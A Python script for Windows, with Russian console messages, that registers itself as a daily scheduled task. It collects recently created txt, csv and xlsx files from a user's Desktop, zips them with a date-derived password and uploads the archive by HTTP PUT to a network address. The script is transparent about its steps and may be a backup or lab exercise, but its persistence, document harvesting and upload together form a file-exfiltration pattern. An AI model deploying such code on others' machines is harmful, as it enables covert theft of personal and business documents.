import socket

import pyminizip
import requests
import win32com.client

import os
from datetime import datetime, timedelta

import zipfile
import tempfile

import psutil


def check_task_exists(task_name):
    try:
        task = root_folder.GetTask(task_name)
        if task:
            return True
    except Exception as e:
        return False


scheduler = win32com.client.Dispatch("Schedule.Service")
scheduler.Connect()
root_folder = scheduler.GetFolder("\\")

task_name = 'TimeToPack'
if check_task_exists(task_name):
    print(f'Задача "{task_name}" уже существует')
else:
    task_def = scheduler.NewTask(0)

    trigger = task_def.Triggers.Create(2)
    trigger.StartBoundary = '2025-01-01T12:00:00'
    trigger.DaysInterval = 1

    action = task_def.Actions.Create(0)
    action.Path = os.path.abspath(__file__)

    root_folder.RegisterTaskDefinition(
        task_name,
        task_def,
        6,
        None,
        None,
        3
    )
    print('Задача была создана')

directory = 'C:\\Users\\sapar\\Desktop'
temp_directory = tempfile.gettempdir()
time_limit = datetime.now() - timedelta(days=1)
file_types = ['txt', 'csv', 'xlsx']

collected_files = []

print('Сканирование диска C на наличие недавно измененных/созданных txt, csv, xlsx файлов...')
for root, dirs, files in os.walk(directory):
    for file in files:
        try:
            file_path = os.path.join(root, file)
            creation_time = datetime.fromtimestamp(os.path.getctime(file_path))
            postfix = file.split('.')[-1]
            if postfix in file_types and creation_time > time_limit:
                collected_files.append(file_path)
        except Exception as e:
            pass
print('Сканирование завершено')


def create_zip(input_files, output_zip):
    with zipfile.ZipFile(output_zip, 'w') as zipf:
        for file in input_files:
            zipf.write(file, arcname=file.split('/')[-1] if '/' in file else file.split('\\')[-1])


def add_passwd(zip_file, output_zip, password):
    compression_level = 1
    input_files = [zip_file]
    for file in input_files:
        pyminizip.compress(file, None, output_zip, password, compression_level)


now = datetime.now()

current_date = now.strftime("%Y-%m-%d")
password = now.strftime("%d/%m/%Y.--")   #
zip_no_passwd = f'{temp_directory}/{current_date}_no_password.zip'
zip_with_passwd = f'{temp_directory}/{current_date}.zip'

create_zip(collected_files, zip_no_passwd)
add_passwd(zip_no_passwd, zip_with_passwd, password)


def get_ip(interface_name):
    interfaces = psutil.net_if_addrs()
    if interface_name in interfaces:
        for addr in interfaces[interface_name]:
            # Ищем IPv4 адрес
            if addr.family == socket.AF_INET:
                return addr.address
    else:
        return None


interface_name = 'Ethernet 2'
ip_address = get_ip(interface_name)

url = f'http://{ip_address}/upload/test2.zip'
file_path = zip_with_passwd

with open(file_path, 'rb') as file:
    response = requests.put(url, files={'file': file})

print(f'Архив успешно был загружен, пароль: {password}' if response.status_code in (201, 204) else 'Ошибка при загрузке файла')
input('Нажмите Enter для завершения...')
